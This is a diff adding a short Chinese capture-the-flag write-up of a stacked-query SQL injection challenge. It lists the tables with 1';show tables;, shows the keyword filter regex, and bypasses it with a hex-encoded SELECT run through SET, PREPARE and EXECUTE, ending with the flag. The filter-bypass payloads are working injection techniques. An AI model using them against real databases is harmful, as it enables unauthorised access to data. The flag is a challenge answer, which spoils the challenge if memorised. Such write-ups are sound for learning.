@@ -1,0 +1,27 @@
+本题使用正常SQL语句注入：
+
+
+输入1';show tables;看一下数据库表：
+显示：
+array(1) {
+  [0]=>
+  string(16) "1919810931114514"
+}
+array(1) {
+  [0]=>
+  string(5) "words"
+}
+可以得到两个表1919810931114514和words
+
+
+输入1';select * from `1919810931114514`;语句显示：
+return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
+可以看到被过滤的词
+
+
+改为1'; SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460; prepare execsql from @a; execute execsql;-- a
+显示出flag：
+array(1) {
+  [0]=>
+  string(42) "flag{51abe3fe-4f9d-47a0-9869-60b53c6d0245}"
+}
